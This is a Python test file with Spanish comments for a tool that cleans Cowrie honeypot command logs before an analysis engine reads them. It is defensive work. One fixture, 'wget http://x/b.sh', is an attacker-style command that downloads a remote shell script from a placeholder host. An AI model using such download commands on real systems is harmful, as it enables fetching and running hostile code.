"""El saneamiento del mensaje al entrar al motor.

Cowrie escribe el comando en la línea del registro con un prefijo que no tipeó nadie: `CMD: ` en
los eventos de entrada y `Command found: ` o `Command not found: ` en los de resultado. El pipeline
lo recorta, pero el bus puede retener mensajes publicados sin ese recorte, y cada uno haría que el
motor razone sobre el prefijo como si fuera parte de lo que el atacante ejecutó.

Lo que se fija acá es el recorte y, sobre todo, que el mensaje original sobreviva en `crudo`. Si el
saneamiento pisara la evidencia, después no habría con qué auditar qué llegó del bus.
"""

from __future__ import annotations

import re
from pathlib import Path

from honeyml.agent.consumer import PREFIJOS_DEL_REGISTRO, EventoDelBus

PIPELINE = Path(__file__).parents[2] / "infra/elastic/logstash/pipeline/10-cowrie.conf"


def _mensaje(comando: str) -> dict[str, str]:
    return {
        "doc_id": "abc123",
        "timestamp": "2026-09-10T04:12:55Z",
        "honeypot": "cowrie",
        "category": "process",
        "action": "command-input",
        "outcome": "unknown",
        "source_ip": "203.0.113.62",
        "session": "a1b2c3",
        "command": comando,
    }


def test_recorta_los_tres_prefijos() -> None:
    """Las tres variantes que emite Cowrie, con el comando intacto detrás."""
    casos = {
        "CMD: uname -a": "uname -a",
        "Command found: uname -s -v -n -m": "uname -s -v -n -m",
        "Command not found: enable": "enable",
    }
    for crudo, esperado in casos.items():
        assert EventoDelBus.desde_mensaje("0-1", _mensaje(crudo)).command == esperado


def test_no_toca_un_comando_limpio() -> None:
    """Lo que ya viene bien pasa sin cambios, que es el caso normal."""
    assert EventoDelBus.desde_mensaje("0-1", _mensaje("wget http://x/b.sh")).command == (
        "wget http://x/b.sh"
    )


def test_recorta_solo_al_principio() -> None:
    """Un comando que menciona el prefijo en el medio no se toca.

    `echo CMD: hola` es un comando válido y distinto de `CMD: echo hola`. Recortar en cualquier
    posición rompería el primero para arreglar el segundo.
    """
    evento = EventoDelBus.desde_mensaje("0-1", _mensaje("echo CMD: hola"))
    assert evento.command == "echo CMD: hola"


def test_recorta_una_sola_vez() -> None:
    """Un prefijo repetido deja el segundo a la vista en lugar de esconderlo.

    El pipeline no lo produce, y justamente por eso conviene que se note: si aparece, es una señal
    de que el pipeline duplicó el recorte, no algo para tapar en silencio.
    """
    evento = EventoDelBus.desde_mensaje("0-1", _mensaje("CMD: CMD: uname -a"))
    assert evento.command == "CMD: uname -a"


def test_conserva_el_mensaje_original() -> None:
    """`crudo` guarda lo que mandó el bus, sin sanear. Es la evidencia de la auditoría."""
    evento = EventoDelBus.desde_mensaje("0-1", _mensaje("Command found: uname -a"))
    assert evento.command == "uname -a"
    assert evento.crudo["command"] == "Command found: uname -a"


def test_el_resumen_muestra_el_comando_saneado() -> None:
    """La línea del registro es lo que se lee en una corrida, así que va sin el prefijo."""
    evento = EventoDelBus.desde_mensaje("0-1", _mensaje("Command not found: system"))
    assert "Command not found" not in evento.resumen()
    assert "system" in evento.resumen()


def test_un_mensaje_sin_comando_no_rompe() -> None:
    """Los eventos de autenticación no traen comando, y son la mitad del bus."""
    campos = _mensaje("")
    del campos["command"]
    assert EventoDelBus.desde_mensaje("0-1", campos).command == ""


def test_el_recorte_es_el_mismo_que_el_del_pipeline() -> None:
    """El mismo recorte vive en dos lados, y tienen que seguir diciendo lo mismo.

    Logstash lo aplica a lo que se indexa de acá en adelante y el consumidor a lo que ya está en el
    bus. Son dos poblaciones distintas, así que las dos copias hacen falta, pero si alguien agrega
    una variante en una sola el motor vuelve a razonar sobre un prefijo. Acá se comparan los
    patrones de verdad, leyendo el archivo de configuración.
    """
    conf = PIPELINE.read_text(encoding="utf-8")
    hallado = re.search(r'gsub\s*=>\s*\["\[process\]\[command_line\]",\s*"([^"]+)"', conf)
    assert hallado is not None, f"no se encontró el gsub del comando en {PIPELINE.name}"
    assert hallado.group(1) == PREFIJOS_DEL_REGISTRO.pattern
